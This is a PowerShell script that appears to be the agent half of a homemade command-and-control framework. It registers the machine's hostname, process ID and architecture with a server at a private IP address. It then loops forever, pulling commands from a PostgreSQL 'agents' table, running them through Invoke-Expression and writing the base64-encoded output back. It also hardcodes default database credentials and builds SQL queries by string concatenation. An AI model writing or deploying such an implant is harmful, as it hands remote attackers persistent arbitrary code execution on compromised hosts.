$url = "192.168.1.101:5000"
$current_user = hostname

function Get-ODBCData{  
    param(
          [string]$query,
          [string]$dbServer = "localhost",   # DB Server (either IP or hostname)
          [string]$dbName   = "postgres", # Name of the database
          [string]$dbUser   = "postgres",    # User we'll use to connect to the database/server
          [string]$dbPass   = "postgres"     # Password for the $dbUser
         )

    $conn = New-Object System.Data.Odbc.OdbcConnection
    $conn.ConnectionString = "Driver={PostgreSQL Unicode(x64)};Server=$dbServer;Port=5432;Database=$dbName;Uid=$dbUser;Pwd=$dbPass;"
    $conn.open()
    $cmd = New-object System.Data.Odbc.OdbcCommand($query,$conn)
    $ds = New-Object system.Data.DataSet
    (New-Object system.Data.odbc.odbcDataAdapter($cmd)).fill($ds) | out-null
    $conn.close()
    $ds.Tables[0]
}


function Register-Command{

$dataTable = Get-ODBCData -query "SELECT * FROM agents"
$hostnames = $dataTable.hostname
foreach($host_name in $hostnames){
    if($host_name -eq $current_user.ToLower()){
        $query = Get-ODBCData -query "SELECT command FROM agents WHERE hostname = '$host_name' LIMIT 1"
        break
    }
}

$cmd = $query.command
$result = Invoke-Expression $cmd 


$bytes = [System.Text.Encoding]::UTF8.GetBytes($result)
$base64Data = [Convert]::ToBase64String($bytes)

$currentDate = Get-Date
$currentTime = $currentDate.ToString('yyyy-MM-dd HH:mm:ss')

foreach($host_name in $hostnames){
    if($host_name -eq $current_user){
        $query = Get-ODBCData -query "UPDATE agents SET result='$base64Data',last_callback = '$currentTime'  WHERE hostname = '$host_name'"
        break
    }
}

}


function Update-Agent{
$dataTable = Get-ODBCData -query "SELECT * FROM agents"
$hostnames = $dataTable.hostname
foreach($host_name in $hostnames){
    if($host_name -eq $current_user.ToLower()){
        $query = Get-ODBCData -query "DELETE FROM agents WHERE hostname = '$host_name'"
    }
}
}

function Register-Agent {
    param (
        [string]$hostname,
        [int]$proc_id,
        [string]$process_name,
        [string]$architecture
    )

    $data = @{
        hostname = $hostname
        pid = $pid
        process_name = $process_name
        architecture = $architecture
    }

    $jsonData = $data | ConvertTo-Json

    try {
        $response = Invoke-WebRequest -Uri "$url/register_agent" -Method Post -Body $jsonData -ContentType "application/json"
    
        # Display the status code and response content
        Write-Output "Status Code: $($response.StatusCode)"
        Write-Output "Response Content: $($response.Content)"
    } catch {
        Write-Warning "Error: $($_.Exception.Message)"
    
    }
    
}

# Function that deletes agent if that agent already exists in the database
Update-Agent


# Register Agent
$hostname = hostname
$proc_id = $PID
$process_name = (Get-Process -Id $PID).ProcessName
$architecture = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
Register-Agent -hostname $hostname -proc_id $proc_id -process_name $process_name -architecture $architecture


while ($true){
Register-Command
}
